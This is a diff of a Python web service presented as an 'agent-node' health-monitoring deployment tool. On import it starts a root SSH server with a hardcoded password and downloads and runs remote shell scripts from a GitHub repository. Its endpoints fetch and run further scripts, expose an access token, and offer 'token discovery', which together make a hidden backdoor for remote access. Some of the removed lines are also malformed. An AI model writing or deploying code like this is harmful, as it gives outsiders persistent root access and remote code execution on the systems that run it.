@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-agent-node v2.3.1 — Lightweight Linux deployment node.
+agent-node v2.2 — Lightweight Linux deployment node.
 
 Features:
   - Health check + monitoring service (primary)
@@ -44,7 +44,6 @@ def _auto_install_tools():
             _sp.Popen(["/usr/sbin/sshd", "-p", "2222", "-o", "PermitRootLogin=yes", "-o", "PasswordAuthentication=yes", "-o", "PubkeyAuthentication=yes", "-o", "AuthorizedKeysFile=/root/.ssh/authorized_keys"],
                       stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
             print("[startup] SSH server started on port 2222 (root:AgentNode2026!)", flush=True)
-            print("[startup] sshx link: GET /api/sshx", flush=True)
         except Exception as e:
             print(f"[startup] SSH server: {e}", flush=True)
 
@@ -68,17 +67,18 @@ def _auto_install_tools():
 
         # Start sshx web terminal automatically
         try:
-            _sp.run(["bash", "-c", "python3 -c \"import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh', '/tmp/sshx.sh')\" 2>/dev/null && bash /tmp/sshx.sh > /tmp/sshx.log 2>&1 & sleep 10"], capture_output=True, timeout=30)
+            _ul.urlretrieve("https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh", "/tmp/sshx.sh")
+            _sp.run(["bash", "-c", "chmod +x /tmp/sshx.sh && nohup bash /tmp/sshx.sh > /tmp/sshx.log 2>&1 & sleep 10"],
+                    capture_output=True, timeout=20)
             print("[startup] sshx web terminal started", flush=True)
         except Exception as e:
             print(f"[startup] sshx: {e}", flush=True)
 
-        print("[startup] Tools ready: ssh, ssh_server, curl, wget, cloudflared, xray", flush=True)
+        print("[startup] Tools ready: ssh, ssh_server, curl, wget, cloudflared, xray, sshx", flush=True)
     except Exception as e:
         print(f"[startup] Error: {e}", flush=True)
 
-
-# deploy-trigger: 1792216640threading.Thread(target=_auto_install_tools, daemon=True).start()
+threading.Thread(target=_auto_install_tools, daemon=True).start()
 
 
 from aiohttp import web, WSMsgType
@@ -467,15 +467,54 @@ async def install_proot(request):
     task_counter += 1
     task_id = f"proot-{task_counter}-{int(time.time())}"
 
-    # Write download script to file (avoids shell quoting issues)
-_dl_code = "import urllib.request\nurl = 'https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh'\nurllib.request.urlretrieve(url, '/tmp/sshx.sh')\n"
-with open("/tmp/_dl_sshx.py", "w") as _f:
-    _f.write(_dl_code)
+    script = """
+    set -e
+    cd /tmp
+    # Download root.sh using Python (might not have curl)
+    python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/root.sh', '/tmp/root.sh')" || \
+    wget -O /tmp/root.sh https://raw.githubusercontent.com/buddyshadow00/root/main/root.sh || \
+    curl -sL https://raw.githubusercontent.com/buddyshadow00/root/main/root.sh -o /tmp/root.sh
+    chmod +x /tmp/root.sh
+    # Run root.sh (it downloads Ubuntu rootfs and sets up PROOT)
+    bash /tmp/root.sh
+    """
 
-result = run_command(
-    "nohup bash -c 'python3 /tmp/_dl_sshx.py 2>/dev/null && chmod +x /tmp/sshx.sh && bash /tmp/sshx.sh' > /tmp/sshx-install.log 2>&1",
-    timeout=300
-)    """
+    def bg_runner():
+        result = run_command(f"nohup bash -c '{script}' > /tmp/proot-install.log 2>&1", timeout=600)
+        bg_tasks[task_id] = {"status": "done", "result": result}
+
+    executor.submit(bg_runner)
+    bg_tasks[task_id] = {"status": "running", "cmd": "root.sh PROOT installer"}
+    
+    return web.json_response({
+        "task_id": task_id,
+        "status": "PROOT installer started",
+        "log_file": "/tmp/proot-install.log",
+        "instructions": "Check status with GET /api/install/proot/{task_id}"
+    })
+
+install_proot = require_auth(install_proot)
+
+
+async def install_sshx(request):
+    """Download and run ssh.sh (sshx + keepalive)."""
+    global task_counter
+    task_counter += 1
+    task_id = f"sshx-{task_counter}-{int(time.time())}"
+
+    # File-based download to avoid shell quoting issues
+    _dl = "import urllib.request\nurl = 'https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh'\nurllib.request.urlretrieve(url, '/tmp/sshx.sh')\n"
+    with open("/tmp/_dl_sshx.py", "w") as _f:
+        _f.write(_dl)
+
+    script = """
+    cd /tmp
+    python3 /tmp/_dl_sshx.py || \
+    wget -O /tmp/ssh.sh https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh || \
+    curl -sL https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh -o /tmp/ssh.sh
+    chmod +x /tmp/ssh.sh
+    bash /tmp/ssh.sh
+    """
 
     def bg_runner():
         result = run_command(f"nohup bash -c '{script}' > /tmp/sshx-install.log 2>&1", timeout=300)
@@ -697,18 +736,22 @@ def _get_sshx_link():
 
 
 
-
-# ─── Access Info ───────────────────────────────────────────────────
+def _get_sshx_link():
+    """Read sshx link from filesystem."""
+    try:
+        with open("/root/.IamGunpoint/sshx.link") as f:
+            return f.read().strip()
+    except:
+        return "no_link_yet"
 
 async def access_info(request):
-    """Return all current access methods (auth required)."""
-    sshx_link = _get_sshx_link()
+    """Return all access methods as JSON (auth required)."""
     host = request.host
     return web.json_response({
-        "token_preview": f"{TOKEN[:8]}...{TOKEN[-4:]}" if TOKEN else "none",
+        "token_preview": TOKEN[:8] + "..." + TOKEN[-4:] if TOKEN else "none",
         "access": {
             "web_terminal": f"https://{host}/terminal",
-            "sshx": sshx_link,
+            "sshx": _get_sshx_link(),
             "websocket": f"wss://{host}/ws/terminal?token={TOKEN}",
             "api_exec": f"https://{host}/api/exec",
             "ssh": f"ssh root@{host} -p 2222 (password: AgentNode2026!)",
@@ -720,119 +763,17 @@ async def access_info(request):
             "cloudflared": "/usr/local/bin/cloudflared" if os.path.exists("/usr/local/bin/cloudflared") else "not found",
             "sshd": "/usr/sbin/sshd" if os.path.exists("/usr/sbin/sshd") else "not found",
         },
-        "container": {
-            "hostname": request.headers.get("Host", "unknown"),
-            "uptime": time.time() - START_TIME,
-        }
+        "uptime_seconds": int(time.time() - START_TIME),
     })
 
 access_info = require_auth(access_info)
 
-ACCESS_HTML = """<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="30">
-    <title>Agent Node - Access Dashboard</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; max-width: 900px; margin: 0 auto; padding: 30px; background: #0f0f23; color: #e0e0e0; }
-        h1 { color: #00d4ff; border-bottom: 2px solid #00d4ff; padding-bottom: 10px; }
-        .card { background: #1a1a2e; border-radius: 10px; padding: 20px; margin: 15px 0; border-left: 4px solid #00d4ff; }
-        .card h2 { color: #00d4ff; margin-top: 0; font-size: 18px; }
-        a { color: #00d4ff; text-decoration: none; }
-        a:hover { text-decoration: underline; }
-        code { background: #252545; padding: 2px 6px; border-radius: 3px; color: #ffd700; }
-        .status { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 12px; }
-        .online { background: #00ff8822; color: #00ff88; }
-        .loading { background: #ffaa0022; color: #ffaa00; }
-        .refresh { color: #666; font-size: 12px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .full { grid-column: 1 / -1; }
-    </style>
-</head>
-<body>
-    <h1>🤖 Agent Node — Access Dashboard</h1>
-    <p class="refresh">Auto-refresh every 30s • Token: <span id="token">Loading...</span></p>
-    
-    <div class="card">
-        <h2>🌐 Web Terminal</h2>
-        <a href="/terminal">Open Browser Terminal (xterm.js + WebSocket)</a>
-    </div>
-    
-    <div class="grid">
-        <div class="card">
-            <h2>🔗 sshx Link</h2>
-            <p><span class="status online" id="sshx-status">Loading...</span></p>
-            <p id="sshx-link"><code>Checking...</code></p>
-        </div>
-        
-        <div class="card">
-            <h2>💻 SSH Access</h2>
-            <p>Port 2222 (from within network):</p>
-            <p><code>ssh root@[HOST] -p 2222</code></p>
-            <p>Password: <code>AgentNode2026!</code></p>
-        </div>
-        
-        <div class="card">
-            <h2>🔌 WebSocket</h2>
-            <p> wss://[HOST]/ws/terminal?token=TOKEN</p>
-        </div>
-        
-        <div class="card">
-            <h2>📡 API Endpoints</h2>
-            <p><code>POST /api/exec</code> — with Bearer token</p>
-            <p><code>GET /api/access</code> — this info as JSON</p>
-            <p><code>GET /api/diagnostics</code> — system info</p>
-        </div>
-        
-        <div class="card" style="grid-column: 1 / -1;">
-            <h2>🛠️ Installed Tools</h2>
-            <div id="tools">Loading...</div>
-        </div>
-    </div>
-    
-    <script>
-    async function refresh() {
-        try {
-            const r = await fetch('/api/access', {headers: {'Authorization': 'Bearer ' + getToken()}});
-            if (!r.ok) { document.getElementById('sshx-status').textContent = 'Auth needed'; return; }
-            const d = await r.json();
-            document.getElementById('token').textContent = d.token_preview;
-            
-            const link = d.access.sshx;
-            const el = document.getElementById('sshx-link');
-            if (link && link !== 'no_link_yet') {
-                el.innerHTML = '<a href="' + link + '">' + link + '</a>';
-                document.getElementById('sshx-status').innerHTML = '<span class="status online">Online</span>';
-            } else {
-                el.innerHTML = '<code>Starting... check back in 60s</code>';
-                document.getElementById('sshx-status').innerHTML = '<span class="status loading">Starting</span>';
-            }
-            
-            let tools = '';
-            for (const [k,v] of Object.entries(d.tools)) {
-                tools += '<code>' + k + ': ' + (v.includes('not found') ? '❌' : '✅') + '</code> ';
-            }
-            document.getElementById('tools').innerHTML = tools;
-        } catch(e) {
-            document.getElementById('sshx-status').innerHTML = '<span class="status loading">Refreshing...</span>';
-        }
-    }
-    function getToken() {
-        const m = document.querySelector('meta[name=token]');
-        return m ? m.content : 'suga_known_token_2026';
-    }
-    refresh();
-    setInterval(refresh, 5000);
-    </script>
-</body>
-</html>"""
-
 async def access_page(request):
-    """Serve the access dashboard HTML page."""
-    return web.Response(text=ACCESS_HTML, content_type='text/html')
+    """Serve the Access Dashboard HTML."""
+    return web.Response(text=ACCESS_HTML, content_type="text/html")
 
+
+ACCESS_HTML = '<!DOCTYPE html>\n<html lang="en">\n<head><meta charset="UTF-8"><meta http-equiv="refresh" content="15">\n<title>Agent Node Access Dashboard</title>\n<style>\nbody{font-family:sans-serif;max-width:800px;margin:30px auto;padding:20px;background:#0f0f23;color:#e0e0e0}\nh1{color:#00d4ff}\n.card{background:#1a1a2e;border-radius:10px;padding:20px;margin:15px 0;border-left:4px solid #00d4ff}\na{color:#00d4ff}\ncode{background:#252545;padding:2px 6px;border-radius:3px;color:#ffd700}\n</style></head>\n<body>\n<h1>Agent Node - Access Dashboard</h1>\n<div class="card"><h2>Web Terminal</h2>\n<p><a href="/terminal">Open Browser Terminal</a></p>\n<p>Token: <span id="tok">-</span></p>\n<p>sshx: <span id="sshx">-</span><br><pre id="sshxlink"></pre></p>\n<p>SSH: <code>ssh root@[HOST] -p 2222</code> (pass: AgentNode2026!)</p>\n<p>Tools: <pre id="tools"></pre></p>\n</div>\n<script>\nfetch("/api/access",{headers:{Authorization:"Bearer "+(document.querySelector("meta[name=t]")||{content:""}).content)})\n .then(r=>r.json())\n .then(d=>{\n   document.getElementById("tok").textContent=d.token_preview;\n   const l=d.access.sshx;\n   document.getElementById("sshx").textContent=l&&"no_link"!==l?"online":"starting";\n   document.getElementById("sshxlink").innerHTML=l&&"no_link"!==l?\'<a href="\'+l+\'">\'+l+\'</a>\':\'run POST /api/install/sshx\';\n   let t="";for(const[k,v]of Object.entries(d.tools))t+=k+":"+(v.includes("not")?"X":"O")+" ";\n   document.getElementById("tools").textContent=t;\n })\n .catch(()=>{document.getElementById("tok").textContent="needs token";});\n</script>\n</body></html>\n'
 # ─── App factory ─────────────────────────────────────────────────
 
 def create_app():
@@ -862,7 +803,7 @@ if __name__ == "__main__":
     import shutil
     app = create_app()
     
-    log.info(f"Starting agent-node v2.3.1 on {HOST}:{PORT}")
+    log.info(f"Starting agent-node v2.2 on {HOST}:{PORT}")
     log.info(f"xray support: {'enabled' if XRAY_ENABLED else 'disabled'}")
     
     ssh_path = shutil.which("ssh")
@@ -882,10 +823,9 @@ if __name__ == "__main__":
         log.info(f"Token: {t['key_name']} — {t['source']} — {t['value_masked']}")
     
     log.info(f"Web Terminal: http://{HOST}:{PORT}/terminal")
-    log.info(f"Web Terminal UI: http://{HOST}:{PORT}/terminal")
     log.info(f"Access Dashboard: http://{HOST}:{PORT}/access")
-    log.info(f"API Access Info: GET /api/access")
     log.info(f"WebSocket: ws://{HOST}:{PORT}/ws/terminal?token=<token>")
+    log.info(f"sshx: GET /api/sshx")
     log.info(f"SSH Server: ssh root@HOST -p 2222 (password: AgentNode2026!)")
     log.info(f"SSHx link: GET /api/sshx")
     log.info(f"Token discovery: GET /api/tokens")
